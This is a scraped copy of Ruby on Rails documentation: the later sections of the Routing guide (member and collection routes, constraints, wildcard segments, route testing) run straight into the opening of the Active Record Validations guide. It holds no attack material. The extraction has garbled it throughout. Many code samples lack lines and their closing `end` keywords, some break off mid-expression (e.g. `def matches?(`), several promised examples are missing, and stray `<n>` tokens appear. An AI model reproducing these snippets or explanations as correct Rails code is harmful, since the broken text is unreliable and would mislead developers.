These concerns can be used in resources to avoid code duplication and share behavior across routes:
resources :messages, concerns: :commentable
The above is equivalent to:
resources :messages do
Also you can use them in any place that you want inside the routes, for example in a scope or namespace call:
  concerns :commentable
### Creating Paths and URLs From Objects
In addition to using the routing helpers, Rails can also create paths and URLs from an array of parameters. 
For example, suppose you have this set of routes:
When using `magazine_ad_path`, you can pass in instances of `Magazine` and `Ad` instead of the numeric IDs:
<%= link_to 'Ad details', magazine_ad_path(@magazine, @ad) %>
You can also use `url_for` with a set of objects, and Rails will automatically determine which route you want:
<%= link_to 'Ad details', url_for([@magazine, @ad]) %>
In this case, Rails will see that `@magazine` is a `Magazine` and `@ad` is an `Ad` and will therefore use the `magazine_ad_path` helper. 
In helpers like `link_to`, you can specify just the object in place of the full `url_for` call:
<%= link_to 'Ad details', [@magazine, @ad] %>
If you wanted to link to just a magazine:
<%= link_to 'Magazine details', @magazine %>
For other actions, you just need to insert the action name as the first element of the array:
<%= link_to 'Edit Ad', [:edit, @magazine, @ad] %>
This allows you to treat instances of your models as URLs, and is a key advantage to using the resourceful style.
### Adding More RESTful Actions
You are not limited to the seven routes that RESTful routing creates by default. 
If you like, you may add additional routes that apply to the collection or individual members of the collection.
#### Adding Member Routes
To add a member route, just add a `member` block into the resource block:
resources :photos do
  member do
    get 'preview'
This will recognize `/photos/1/preview` with GET, and route to the `preview` action of `PhotosController`, with the resource id value passed in `params[:id]`. 
It will also create the `preview_photo_url` and `preview_photo_path` helpers.
Within the block of member routes, each route name specifies the HTTP verb<n>will be recognized. 
If you don't have multiple `member` routes, you can also pass `:on` to a<n>route, eliminating the block:
  get 'preview', on: :member
You can leave out the `:on` option, this will create the same member route except that the resource id value will be available in `params[:photo_id]` instead of `params[:id]`.
#### Adding Collection Routes
To add a route to the collection:
  collection do
    get 'search'
This will enable Rails to recognize paths such as `/photos/search` with GET, and route to the `search` action of `PhotosController`. 
It will also create the `search_photos_url` and `search_photos_path` route helpers.
Just as with member routes, you can pass `:on` to a route:
  get 'search', on: :collection
#### Adding Routes for Additional New Actions
To add an alternate new action using the `:on` shortcut:
resources :comments do
  get 'preview', on: :new
This will enable Rails to recognize paths such as `/comments/new/preview` with GET, and route to the `preview` action of `CommentsController`. 
It will also create the `preview_new_comment_url` and `preview_new_comment_path` route helpers.
TIP: If you find yourself adding many extra actions to a resourceful route, it's time to stop and ask yourself whether you're disguising the presence of another resource.
Non-Resourceful Routes
In addition to resource routing, Rails has powerful support for routing arbitrary URLs to actions. 
Here, you don't get groups of routes automatically generated by resourceful routing. 
Instead, you set up each route within your application separately.
While you should usually use resourceful routing, there are still many places where the simpler routing is more appropriate. 
There's no need to try to shoehorn every last piece of your application into a resourceful framework if that's not a good fit.
In particular, simple routing makes it very easy to map legacy URLs to new Rails actions.
### Bound Parameters
When you set up a regular route, you supply a series of symbols that Rails maps to parts of an incoming HTTP request. 
Two of these symbols are special: `:controller` maps to the name of a controller in your application, and `:action` maps to the name of an action within that controller. 
For example, consider this route:
get ':controller(/:action(/:id))'
If an incoming request of `/photos/show/1` is processed by this route (because it hasn't matched any previous route in the file), then the result will be to invoke the `show` action of the `PhotosController`, and to make the final parameter `"1"` available as `params[:id]`. 
This route will also route the incoming request of `/photos` to `PhotosController#index`, since `:action` and `:id` are optional parameters, denoted by parentheses.
### Dynamic Segments
You can set up as many dynamic segments within a regular route as you like. 
Anything other than `:controller` or `:action` will be available to the action as part of `params`. 
If you set up this route:
get ':controller/:action/:id/:user_id'
An incoming path of `/photos/show/1/2` will be dispatched to the `show` action of the `PhotosController`. 
`params[:id]` will be `"1"`, and `params[:user_id]` will be `"2"`.
NOTE: You can't use `:namespace` or `:module` with a `:controller` path segment. 
If you need to do this then use a constraint on :controller that matches the namespace you require. e.g:
get ':controller(/:action(/:id))', controller: /admin\/[^\/]+/
TIP: By default, dynamic segments don't accept dots - this is because the dot is used as a separator for formatted routes. 
If you need to use a dot within a dynamic segment, add a constraint that overrides this – for example, `id: /[^\/]+/` allows anything except a slash.
### Static Segments
You can specify static segments when creating a route by not prepending a colon to a fragment:
get ':controller/:action/:id/with_user/:user_id'
This route would respond to paths such as `/photos/show/1/with_user/2`. 
In this case, `params` would be `{ controller: 'photos', action: 'show', id: '1', user_id: '2' }`.
### The Query String
The `params` will also include any parameters from the query string. 
For example, with this route:
get ':controller/:action/:id'
An incoming path of `/photos/show/1?user_id=2` will be dispatched to the `show` action of the `Photos` controller. 
`params` will be `{ controller: 'photos', action: 'show', id: '1', user_id: '2' }`.
### Defining Defaults
You do not need to explicitly use the `:controller` and `:action` symbols within a route. 
You can supply them as defaults:
get 'photos/:id', to: 'photos#show'
With this route, Rails will match an incoming path of `/photos/12` to the `show` action of `PhotosController`.
You can also define other defaults in a route by supplying a hash for the `:defaults` option. 
This even applies to parameters that you do not specify as dynamic segments. 
For example:
get 'photos/:id', to: 'photos#show', defaults: { format: 'jpg' }
Rails would match `photos/12` to the `show` action of `PhotosController`, and set `params[:format]` to `"jpg"`.
### Naming Routes
You can specify a name for any route using the `:as` option:
get 'exit', to: 'sessions#destroy', as: :logout
This will create `logout_path` and `logout_url` as named helpers in your application. 
Calling `logout_path` will return `/exit`
You can also use this to override routing methods defined by resources, like this:
get ':username', to: 'users#show', as: :user
This will define a `user_path` method that will be available in controllers, helpers and views that will go to a route such as `/bob`. 
Inside the `show` action of `UsersController`, `params[:username]` will contain the username for the user. 
Change `:username` in the route definition if you do not want your parameter name to be `:username`.
### HTTP Verb Constraints
In general, you should use the `get`, `post`, `put`, `patch`  and `delete` methods to constrain a route to a particular verb. 
You can use the `match` method with the `:via` option to match multiple verbs at once:
match 'photos', to: 'photos#show', via: [:get, :post]
You can match all verbs to a particular route using `via: :all`:
match 'photos', to: 'photos#show', via: :all
NOTE: Routing both `GET` and `POST` requests to a single action has security implications. 
### Segment Constraints
You can use the `:constraints` option to enforce a format for a dynamic segment:
get 'photos/:id', to: 'photos#show', constraints: { id: /[A-Z]\d{5}/ }
This route would match paths such as `/photos/A12345`, but not `/photos/893`. 
You can more succinctly express the same route this way:
get 'photos/:id', to: 'photos#show', id: /[A-Z]\d{5}/
`:constraints` takes regular expressions with the restriction that regexp anchors can't be used. 
For example, the following route will not work:
However, note that you don't need to use anchors because all routes are anchored at the start.
get '/:username', to: 'users#show'
### Request-Based Constraints
You specify a request-based constraint the same way that you specify a segment constraint:
You can also specify constraints in a block form:
  constraints subdomain: 'admin' do
Therefore, constraint values should match the corresponding Request object method return type. 
For example: `constraints: { subdomain: 'api' }` will match an `api` subdomain as expected, however using a symbol `constraints: { subdomain: :api }` will not, because `request.subdomain` returns `'api'` as a String.
### Advanced Constraints
If you have a more advanced constraint, you can provide an object that responds to `matches?` that Rails should use. 
Let's say you wanted to route all users on a blacklist to the `BlacklistController`. 
You could do:
class BlacklistConstraint
  def initialize
    @ips = Blacklist.retrieve_ips
  def matches?(
    @ips.include?(
Rails.application.routes.draw do
  get '*path', to: 'blacklist#index',
    constraints: BlacklistConstraint.new
You can also specify constraints as a lambda:
    constraints: lambda { |request| Blacklist.retrieve_ips.include?(
request.remote_ip) }
Both the `matches?` method and the lambda gets the `request` object as an argument.
### Route Globbing and Wildcard Segments
Route globbing is a way to specify that a particular parameter should be matched to all the remaining parts of a route. 
get 'photos/*other', to: 'photos#unknown'
This route would match `photos/12` or `/photos/long/path/to/12`, setting `params[:other]` to `"12"` or `"long/path/to/12"`. 
The fragments prefixed with a star are called "wildcard segments".
Wildcard segments can occur anywhere in a route. 
get 'books/*section/:title', to: 'books#show'
would match `books/some/section/last-words-a-memoir` with `params[:section]` equals `'some/section'`, and `params[:title]` equals `'last-words-a-memoir'`.
Technically, a route can have even more than one wildcard segment. 
The matcher assigns segments to parameters in an intuitive way. 
get '*a/foo/*b', to: 'test#index'
would match `zoo/woo/foo/bar/baz` with `params[:a]` equals `'zoo/woo'`, and `params[:b]` equals `'bar/baz'`.
If you want the old 3.0.x behavior back, you could supply `format: false` like this:
get '*pages', to: 'pages#show', format: false
NOTE: If you want to make the format segment mandatory, so it cannot be omitted, you can supply `format: true` like this:
get '*pages', to: 'pages#show', format: true
You can redirect any path to another path using the `redirect` helper in your router:
You can also reuse dynamic segments from the match in the path to redirect to:
You can also provide a block to redirect, which receives the symbolized path parameters and the request object:
Please note that this redirection is a 301 "Moved Permanently" redirect. 
Keep in mind that some web browsers or proxy servers will cache this type of redirect, making the old page inaccessible.
In all of these cases, if you don't provide the leading host (`http://www.example.com`), Rails will take those details from the current request.
### Routing to Rack Applications
match '/application.js', to: Sprockets, via: :all
As long as `Sprockets` responds to `call` and returns a `[status, headers, body]`, the router won't know the difference between the Rack application and an action. 
This is an appropriate use of `via: :all`, as you will want to allow your Rack application to handle all verbs as it considers appropriate.
### Using `root`
You can specify what Rails should route `'/'` to with the `root` method:
root to: 'pages#main'
root 'pages#main' # shortcut for the above
You should put the `root` route at the top of the file, because it is the most popular route and should be matched first.
NOTE: The `root` route only routes `GET` requests to the action.
You can also use root inside namespaces and scopes as well. 
  root to: "admin#index"
root to: "home#index"
### Unicode character routes
You can specify unicode character routes directly. 
get 'こんにちは', to: 'welcome#index'
Customizing Resourceful Routes
Rails allows you to customize virtually any generic part of the resourceful helpers.
### Specifying a Controller to Use
The `:controller` option lets you explicitly specify a controller to use for the resource. 
resources :photos, controller: 'images'
will recognize incoming paths beginning with `/photos` but route to the `Images` controller:
| HTTP Verb | Path             | Controller#Action | Named Helper         |
| --------- | ---------------- | ----------------- | -------------------- |
| GET       | /photos          | images#index      | photos_path          |
| GET       | /photos/new      | images#new        | new_photo_path       |
| POST      | /photos          | images#create     | photos_path          |
| GET       | /photos/:id      | images#show       | photo_path(:id)      |
| GET       | /photos/:id/edit | images#edit       | edit_photo_path(:id) |
| PATCH/PUT | /photos/:id      | images#update     | photo_path(:id)      |
| DELETE    | /photos/:id      | images#destroy    | photo_path(:id)      |
NOTE: Use `photos_path`, `new_photo_path`, etc. to generate paths for this resource.
For namespaced controllers you can use the directory notation. 
resources :user_permissions, controller: 'admin/user_permissions'
This will route to the `Admin::UserPermissions` controller.
NOTE: Only the directory notation is supported. 
Specifying the<n>controller with Ruby constant notation (eg. `controller: 'Admin::UserPermissions'`)<n>can lead to routing problems and results in<n>a warning.
### Specifying Constraints
You can use the `:constraints` option to specify a required format on the implicit `id`. 
This declaration constrains the `:id` parameter to match the supplied regular expression. 
So, in this case, the router would no longer match `/photos/1` to this route. 
Instead, `/photos/RR27` would match.
You can specify a single constraint to apply to a number of routes by using the block form:
constraints(id: /[A-Z][A-Z][0-9]+/) do
  resources :photos
  resources :accounts
NOTE: Of course, you can use the more advanced constraints available in non-resourceful routes in this context.
TIP: By default the `:id` parameter doesn't accept dots - this is because the dot is used as a separator for formatted routes. 
If you need to use a dot within an `:id` add a constraint which overrides this - for example `id: /[^\/]+/` allows anything except a slash.
### Overriding the Named Helpers
The `:as` option lets you override the normal naming for the named route helpers. 
resources :photos, as: 'images'
will recognize incoming paths beginning with `/photos` and route the requests to `PhotosController`, but use the value of the :as option to name the helpers.
| GET       | /photos          | photos#index      | images_path          |
| GET       | /photos/new      | photos#new        | new_image_path       |
| POST      | /photos          | photos#create     | images_path          |
| GET       | /photos/:id      | photos#show       | image_path(:id)      |
| GET       | /photos/:id/edit | photos#edit       | edit_image_path(:id) |
| PATCH/PUT | /photos/:id      | photos#update     | image_path(:id)      |
| DELETE    | /photos/:id      | photos#destroy    | image_path(:id)      |
### Overriding the `new` and `edit` Segments
resources :photos, path_names: { new: 'make', edit: 'change' }
This would cause the routing to recognize paths such as:
/photos/make
/photos/1/change
NOTE: The actual action names aren't changed by this option. 
The two paths shown would still route to the `new` and `edit` actions.
TIP: If you find yourself wanting to change this option uniformly for all of your routes, you can use a scope.
scope path_names: { new: 'make' } do
  # rest of your routes
### Prefixing the Named Route Helpers
You can use the `:as` option to prefix the named route helpers that Rails generates for a route. 
Use this option to prevent name collisions between routes using a path scope. 
scope 'admin' do
  resources :photos, as: 'admin_photos'
To prefix a group of route helpers, use `:as` with `scope`:
scope 'admin', as: 'admin' do
  resources :photos, :accounts
resources :photos, :accounts
This will generate routes such as `admin_photos_path` and `admin_accounts_path` which map to `/admin/photos` and `/admin/accounts` respectively.
NOTE: The `namespace` scope will automatically add `:as` as well as `:module` and `:path` prefixes.
You can prefix routes with a named parameter also:
scope ':username' do
### Restricting the Routes Created
You can use the `:only` and `:except` options to fine-tune this behavior. 
The `:only` option tells Rails to create only the specified routes:
resources :photos, only: [:index, :show]
Now, a `GET` request to `/photos` would succeed, but a `POST` request to `/photos` (which would ordinarily be routed to the `create` action) will fail.
The `:except` option specifies a route or list of routes that Rails should _not_ create:
resources :photos, except: :destroy
In this case, Rails will create all of the normal routes except the route for `destroy` (a `DELETE` request to `/photos/:id`).
TIP: If your application has many RESTful routes, using `:only` and `:except` to generate only the routes that you actually need can cut down on memory use and speed up the routing process.
### Translated Paths
Using `scope`, we can alter path names generated by resources:
scope(path_names: { new: 'neu', edit: 'bearbeiten' }) do
  resources :categories, path: 'kategorien'
Rails now creates routes to the `CategoriesController`.
| HTTP Verb | Path                       | Controller#Action  | Named Helper            |
| --------- | -------------------------- | ------------------ | ----------------------- |
| GET       | /kategorien                | categories#index   | categories_path         |
| GET       | /kategorien/neu            | categories#new     | new_category_path       |
| POST      | /kategorien                | categories#create  | categories_path         |
| GET       | /kategorien/:id            | categories#show    | category_path(:id)      |
| GET       | /kategorien/:id/bearbeiten | categories#edit    | edit_category_path(:id) |
| PATCH/PUT | /kategorien/:id            | categories#update  | category_path(:id)      |
| DELETE    | /kategorien/:id            | categories#destroy | category_path(:id)      |
### Overriding the Singular Form
If you want to define the singular form of a resource, you should add additional rules to the `Inflector`:
ActiveSupport::Inflector.inflections do |inflect|
  inflect.irregular 'tooth', 'teeth'
### Using `:as` in Nested Resources
The `:as` option overrides the automatically-generated name for the resource in nested route helpers. 
  resources :ads, as: 'periodical_ads'
This will create routing helpers such as `magazine_periodical_ads_url` and `edit_magazine_periodical_ad_path`.
Parameters
Inspecting and Testing Routes
Rails offers facilities for inspecting and testing your routes.
### Listing Existing Routes
You can also execute the `rake routes` command in your terminal to produce the same output.
Both methods will list all of your routes, in the same order that they appear in `routes.rb`. 
For each route, you'll see:
* The route name (if any)
* The HTTP verb used (if the route doesn't respond to all verbs)
* The URL pattern to match
* The routing parameters for the route
For example, here's a small section of the `rake routes` output for a RESTful route:
    users GET    /users(.:format)          users#index
          POST   /users(.:format)          users#create
edit_user GET    /users/:id/edit(.:format) users#edit
You may restrict the listing to the routes that map to a particular controller setting the `CONTROLLER` environment variable:
TIP: You'll find that the output from `rake routes` is much more readable if you widen your terminal window until the output lines don't wrap.
### Testing Routes
Routes should be included in your testing strategy (just like the rest of your application). 
Rails offers three [built-in assertions](http://api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html) designed to make testing routes simpler:
* `assert_generates`
* `assert_recognizes`
* `assert_routing`
#### The `assert_generates` Assertion
`assert_generates` asserts that a particular set of options generate a particular path and can be used with default routes or custom routes. 
assert_generates '/photos/1', { controller: 'photos', action: 'show', id: '1' }
assert_generates '/about', controller: 'pages', action: 'about'
#### The `assert_recognizes` Assertion
`assert_recognizes` is the inverse of `assert_generates`. 
It asserts that a given path is recognized and routes it to a particular spot in your application. 
assert_recognizes({ controller: 'photos', action: 'show', id: '1' }, '/photos/1')
You can supply a `:method` argument to specify the HTTP verb:
assert_recognizes({ controller: 'photos', action: 'create' }, { path: 'photos', method: :post })
#### The `assert_routing` Assertion
The `assert_routing` assertion checks the route both ways: it tests that the path generates the options, and that the options generate the path. 
Thus, it combines the functions of `assert_generates` and `assert_recognizes`:
assert_routing({ path: 'photos', method: :post }, { controller: 'photos', action: 'create' })
Active Record Validations
This guide teaches you how to validate the state of objects before they go into<n>the database using Active Record's validations feature.
* How to use the built-in Active Record validation helpers.
* How to create your own custom validation methods.
* How to work with the error messages generated by the validation process.
Validations Overview
Here's an example of a very simple validation:
Person.create(name: "John Doe").valid? 
Person.create(name: nil).valid? 
As you can see, our validation lets us know that our `Person` is not valid<n>without a `name` attribute. 
The second `Person` will not be persisted to the<n>database.
Before we dig into more details, let's talk about how validations fit into the<n>big picture of your application.
### Why Use Validations?
Validations are used to ensure that only valid data is saved into your<n>database. 
For example, it may be important to your application to ensure that<n>every user provides a valid email address and mailing address. 
Model-level<n>validations are the best way to ensure that only valid data is saved into your<n>database. 
They are database agnostic, cannot be bypassed by end users, and are<n>convenient to test and maintain. 
Rails makes them easy to use, provides<n>built-in helpers for common needs, and allows you to create your own validation<n>methods as well.
There are several other ways to validate data before it is saved into your<n>database, including native database constraints, client-side validations,<n>controller-level validations. 
Here's a summary of the pros and cons:
* Client-side validations can be useful, but are generally unreliable if used<n>  alone. 
If they are implemented using JavaScript, they may be bypassed if<n>  JavaScript is turned off in the user's browser. 
However, if combined with<n>  other techniques, client-side validation can be a convenient way to provide<n>  users with immediate feedback as they use your site.
* Controller-level validations can be tempting to use, but often become<n>  unwieldy and difficult to test and maintain. 
Whenever possible, it's a good<n>  idea to keep your controllers skinny, as it will make your application a<n>  pleasure to work with in the long run.
Choose these in certain, specific cases. 
It's the opinion of the Rails team<n>that model-level validations are the most appropriate in most circumstances.
### When Does Validation Happen?
There are two kinds of Active Record objects: those that correspond to a row<n>inside your database and those that do not. 
When you create a fresh object, for<n>example using the `new` method, that object does not belong to the database<n>yet. 
Once you call `save` upon that object it will be saved into the<n>appropriate database table. 
Active Record uses the `new_record?` instance<n>method to determine whether an object is already in the database or not.
Consider the following simple Active Record class:
We can see how it works by looking at some `rails console` output:
>> p = Person.new(name: "John Doe")
=> #<Person id: nil, name: "John Doe", created_at: nil, updated_at: nil>
>> p.new_record?
>> p.save
=> false
Creating and saving a new record will send an SQL `INSERT` operation to the<n>database. 
Updating an existing record will send an SQL `UPDATE` operation<n>instead. 
Validations are typically run before these commands are sent to the<n>database. 
If any validations fail, the object will be marked as invalid and<n>Active Record will not perform the `INSERT` or `UPDATE` operation. 
This avoids<n>storing an invalid object in the database. 
You can choose to have specific<n>validations run when an object is created, saved, or updated.
CAUTION: There are many ways to change the state of an object in the database.
Some methods will trigger validations, but some will not. 
This means that it's<n>possible to save an object in the database in an invalid state if you aren't<n>careful.
The following methods trigger validations, and will save the object to the<n>database only if the object is valid:
* `create`
* `create!
* `save`
* `save!
* `update`
* `update!
The bang versions (e.g. `save!`) raise an exception if the record is invalid.
The non-bang versions don't, `save` and `update` return `false`,<n>`create` just returns the object.
### Skipping Validations
The following methods skip validations, and will save the object to the<n>database regardless of its validity. 
They should be used with caution.
* `decrement!
* `decrement_counter`
* `increment!
* `increment_counter`
* `toggle!
* `touch`
* `update_all`
* `update_attribute`
* `update_column`
* `update_columns`
* `update_counters`
Note that `save` also has the ability to skip validations if passed `validate:<n>false` as argument. 
This technique should be used with caution.
* `save(validate: false)`
### `valid?` and `invalid?
To verify whether or not an object is valid, Rails uses the `valid?` method.
You can also use this method on your own. `valid?` triggers your validations<n>and returns true if no errors were found in the object, and false otherwise.
As you saw above:
After Active Record has performed validations, any errors found can be accessed<n>through the `errors.messages` instance method, which returns a collection of errors.
By definition, an object is valid if this collection is empty after running<n>validations.
Note that an object instantiated with `new` will not report errors even if it's<n>technically invalid, because validations are not run when using `new`.
>> p = Person.new
# => #<Person id: nil, name: nil>
>> p.errors.messages
>> p.valid?
# => {name:["can't be blank"]}
>> p = Person.create
>> p.save!
# => ActiveRecord::RecordInvalid: Validation failed: Name can't be blank
>> Person.create!
`invalid?` is simply the inverse of `valid?`. 
It triggers your validations,<n>returning true if any errors were found in the object, and false otherwise.
### `errors[]`
To verify whether or not a particular attribute of an object is valid, you can<n>use `errors[:attribute]`. 
It returns an array of all the errors for<n>`:attribute`. 
If there are no errors on the specified attribute, an empty array<n>is returned.
This method is only useful _after_ validations have been run, because it only<n>inspects the errors collection and does not trigger validations itself. 
It's<n>different from the `ActiveRecord::Base#invalid?` method explained above because<n>it doesn't verify the validity of the object as a whole. 
It only checks to see<n>whether there are errors found on an individual attribute of the object.
>> Person.new.errors[:name].any? 
>> Person.create.errors[:name].any? 
We'll cover validation errors in greater depth in the [Working with Validation<n>Errors](#working-with-validation-errors) section. 
For now, let's turn to the<n>built-in validation helpers that Rails provides by default.
Validation Helpers
------------------
Active Record offers many pre-defined validation helpers that you can use<n>directly inside your class definitions. 
These helpers provide common validation<n>rules. 
Every time a validation fails, an error message is added to the object's<n>`errors` collection, and this message is associated with the attribute being<n>validated.
Each helper accepts an arbitrary number of attribute names, so with a single<n>line of code you can add the same kind of validation to several attributes.
All of them accept the `:on` and `:message` options, which define when the<n>validation should be run and what message should be added to the `errors`<n>collection if it fails, respectively. 
The `:on` option takes one of the values<n>`:create` or `:update`. 
There is a default error<n>message for each one of the validation helpers. 
These messages are used when<n>the `:message` option isn't specified. 
Let's take a look at each one of the<n>available helpers.
### `acceptance`
This method validates that a checkbox on the user interface was checked when a<n>form was submitted. 
This is typically used when the user needs to agree to your<n>application's terms of service, confirm reading some text, or any similar<n>concept. 
This validation is very specific to web applications and this<n>'acceptance' does not need to be recorded anywhere in your database (if you<n>don't have a field for it, the helper will just create a virtual attribute).
  validates :terms_of_service, acceptance: true
The default error message for this helper is _"must be accepted"_.
It can receive an `:accept` option, which determines the value that will be<n>considered acceptance. 
It defaults to "1" and can be easily changed.
  validates :terms_of_service, acceptance: { accept: 'yes' }
### `validates_associated`
You should use this helper when your model has associations with other models<n>and they also need to be validated. 
When you try to save your object, `valid?`<n>will be called upon each one of the associated objects.
class Library < ActiveRecord::Base
  has_many :books
  validates_associated :books
This validation will work with all of the association types.
CAUTION: Don't use `validates_associated` on both ends of your associations.
They would call each other in an infinite loop.
The default error message for `validates_associated` is _"is invalid"_. 
Note<n>that each associated object will contain its own `errors` collection; errors do<n>not bubble up to the calling model.
### `confirmation`
You should use this helper when you have two text fields that should receive<n>exactly the same content. 
For example, you may want to confirm an email address<n>or a password. 
This validation creates a virtual attribute whose name is the<n>name of the field that has to be confirmed with "_confirmation" appended.
  validates :email, confirmation: true
In your view template you could use something like
<%= text_field :person, :email %>
<%= text_field :person, :email_confirmation %>
This check is performed only if `email_confirmation` is not `nil`. 
To require<n>confirmation, make sure to add a presence check for the confirmation attribute<n>(we'll take a look at `presence` later on this guide):
  validates :email_confirmation, presence: true
The default error message for this helper is _"doesn't match confirmation"_.
### `exclusion`
This helper validates that the attributes' values are not included in a given<n>set. 
In fact, this set can be any enumerable object.
class Account < ActiveRecord::Base
  validates :subdomain, exclusion: { in: %w(www us ca jp),
    message: "%{value} is reserved." 
The `exclusion` helper has an option `:in` that receives the set of values that<n>will not be accepted for the validated attributes. 
The `:in` option has an<n>alias called `:within` that you can use for the same purpose, if you'd like to.<n>
This example uses the `:message` option to show how you can include the<n>attribute's value.
The default error message is _"is reserved"_.
### `format`
This helper validates the attributes' values by testing whether they match a<n>given regular expression, which is specified using the `:with` option.
  validates :legacy_code, format: { with: /\A[a-zA-Z]+\z/,
    message: "only allows letters" }
The default error message is _"is invalid"_.
### `inclusion`
This helper validates that the attributes' values are included in a given set.
class Coffee < ActiveRecord::Base
  validates :size, inclusion: { in: %w(small medium large),
The `inclusion` helper has an option `:in` that receives the set of values that<n>will be accepted. 
The `:in` option has an alias called `:within` that you can<n>use for the same purpose, if you'd like to. 
The previous example uses the<n>`:message` option to show how you can include the attribute's value.
The default error message for this helper is _"is not included in the list"_.
### `length`
This helper validates the length of the attributes' values. 
It provides a<n>variety of options, so you can specify length constraints in different ways:
  validates :name, length: { minimum: 2 }
  validates :bio, length: { maximum: 500 }
  validates :password, length: { in: 6..20 }
  validates :registration_number, length: { is: 6 }
The possible length constraint options are:
* `:minimum` - The attribute cannot have less than the specified length.
* `:maximum` - The attribute cannot have more than the specified length.
* `:in` (or `:within`) - The attribute length must be included in a given<n>  interval. 
The value for this option must be a range.
* `:is` - The attribute length must be equal to the given value.
The default error messages depend on the type of length validation being<n>performed. 
You can personalize these messages using the `:wrong_length`,<n>`:too_long`, and `:too_short` options and `%{count}` as a placeholder for the<n>number corresponding to the length constraint being used. 
You can still use the<n>`:message` option to specify an error message.
  validates :bio, length: { maximum: 1000,
This helper counts characters by default, but you can split the value in a<n>different way using the `:tokenizer` option:
class Essay < ActiveRecord::Base
  validates :content, length: {
    minimum: 300,
    maximum: 400,
    too_short: "must have at least %{count} words",
Note that the default error messages are plural (e.g., "is too short (minimum<n>is %{count} characters)"). 
For this reason, when `:minimum` is 1 you should<n>provide a personalized message or use `presence: true` instead. 
### `numericality`
This helper validates that your attributes have only numeric values. 
By<n>default, it will match an optional sign followed by an integral or floating<n>point number. 
To specify that only integral numbers are allowed set<n>`:only_integer` to true.
If you set `:only_integer` to `true`, then it will use the
regular expression to validate the attribute's value. 
Otherwise, it will try to<n>convert the value to a number using `Float`.
WARNING. Note that the regular expression above allows a trailing newline<n>character.
class Player < ActiveRecord::Base
  validates :points, numericality: true
  validates :games_played, numericality: { only_integer: true }
Besides `:only_integer`, this helper also accepts the following options to add<n>constraints to acceptable values:
* `:greater_than` - Specifies the value must be greater than the supplied<n>  value. 
The default error message for this option is _"must be greater than<n>  %{count}"_.
* `:greater_than_or_equal_to` - Specifies the value must be greater than or<n>  equal to the supplied value. 
The default error message for this option is<n>  _"must be greater than or equal to %{count}"_.
* `:equal_to` - Specifies the value must be equal to the supplied value. 
The<n>  default error message for this option is _"must be equal to %{count}"_.
* `:less_than` - Specifies the value must be less than the supplied value. 
The<n>  default error message for this option is _"must be less than %{count}"_.
* `:less_than_or_equal_to` - Specifies the value must be less than or equal the<n>  supplied value. 
The default error message for this option is _"must be less<n>  than or equal to %{count}"_.
* `:odd` - Specifies the value must be an odd number if set to true. 
The<n>  default error message for this option is _"must be odd"_.
* `:even` - Specifies the value must be an even number if set to true. 
The<n>  default error message for this option is _"must be even"_.
The default error message is _"is not a number"_.
### `presence`
This helper validates that the specified attributes are not empty. 
It uses the<n>`blank?` method to check if the value is either `nil` or a blank string, that<n>is, a string that is either empty or consists of whitespace.
  validates :name, :login, :email, presence: true
If you want to be sure that an association is present, you'll need to test<n>whether the associated object itself is present, and not the foreign key used<n>to map the association.
class LineItem < ActiveRecord::Base
  belongs_to :order
  validates :order, presence: true
In order to validate associated records whose presence is required, you must<n>specify the `:inverse_of` option for the association:
  has_many :line_items, inverse_of: :order
If you validate the presence of an object associated via a `has_one` or<n>`has_many` relationship, it will check that the object is neither `blank?` nor<n>`marked_for_destruction?`.
### `absence`
This helper validates that the specified attributes are absent. 
It uses the<n>`present?` method to check if the value is not either nil or a blank string, that<n>is, a string that is either empty or consists of whitespace.
  validates :name, :login, :email, absence: true
If you want to be sure that an association is absent, you'll need to test<n>whether the associated object itself is absent, and not the foreign key used<n>to map the association.
  validates :order, absence: true
In order to validate associated records whose absence is required, you must<n>specify the `:inverse_of` option for the association:
If you validate the absence of an object associated via a `has_one` or<n>`has_many` relationship, it will check that the object is neither `present?` nor<n>`marked_for_destruction?`.
Since `false.present?` is false, if you want to validate the absence of a boolean<n>field you should use `validates :field_name, exclusion: { in: [true, false] }`.
The default error message is _"must be blank"_.
### `uniqueness`
This helper validates that the attribute's value is unique right before the<n>object gets saved. 
It does not create a uniqueness constraint in the database,<n>so it may happen that two different database connections create two records<n>with the same value for a column that you intend to be unique. 
To avoid that,<n>you must create a unique index on both columns in your database. 
See<n>[the MySQL manual](http://dev.mysql.com/doc/refman/5.6/en/multiple-column-indexes.html)<n>for more details about multiple column indexes.
  validates :email, uniqueness: true
The validation happens by performing an SQL query into the model's table,<n>searching for an existing record with the same value in that attribute.
There is a `:scope` option that you can use to specify other attributes that<n>are used to limit the uniqueness check:
class Holiday < ActiveRecord::Base
  validates :name, uniqueness: { scope: :year,
    message: "should happen once per year" }
There is also a `:case_sensitive` option that you can use to define whether the<n>uniqueness constraint will be case sensitive or not. 
This option defaults to<n>true.
  validates :name, uniqueness: { case_sensitive: false }
WARNING. Note that some databases are configured to perform case-insensitive<n>searches anyway.
The default error message is _"has already been taken"_.
### `validates_with`
This helper passes the record to a separate class for validation.
class GoodnessValidator < ActiveModel::Validator
  def validate(record)
    if record.first_name == "Evil"
      record.errors[:base] << "This person is evil"
  validates_with GoodnessValidator
NOTE: Errors added to `record.errors[:base]` relate to the state of the record<n>as a whole, and not to a specific attribute.
The `validates_with` helper takes a class, or a list of classes to use for<n>validation. 
There is no default error message for `validates_with`. 
You must<n>manually add errors to the record's errors collection in the validator class.
To implement the validate method, you must have a `record` parameter defined,<n>which is the record to be validated.
Like all other validations, `validates_with` takes the `:if`, `:unless` and<n>`:on` options. 
If you pass any other options, it will send those options to the<n>validator class as `options`:
    if options[:fields].any?{
|field| record.send(field) == "Evil" }
  validates_with GoodnessValidator, fields: [:first_name, :last_name]
Note that the validator will be initialized *only once* for the whole application<n>life cycle, and not on each validation run, so be careful about using instance<n>variables inside it.
If your validator is complex enough that you want instance variables, you can<n>easily use a plain old Ruby object instead:
  validate do |person|
    GoodnessValidator.new(person).validate
class GoodnessValidator
  def initialize(person)
    @person = person
  def validate
    if some_complex_condition_involving_ivars_and_private_methods?
      @person.errors[:base] << "This person is evil"
### `validates_each`
This helper validates attributes against a block. 
It doesn't have a predefined<n>validation function. 
In the following example,<n>we don't want names and surnames to begin with lower case.
  validates_each :name, :surname do |record, attr, value|
The block receives the record, the attribute's name and the attribute's value.<n>
You can do anything you like to check for valid data within the block. 
If your<n>validation fails, you should add an error message to the model, therefore<n>making it invalid.
Common Validation Options
These are common validation options:
### `:allow_nil`
The `:allow_nil` option skips the validation when the value being validated is<n>`nil`.
    message: "%{value} is not a valid size" }, allow_nil: true
### `:allow_blank`
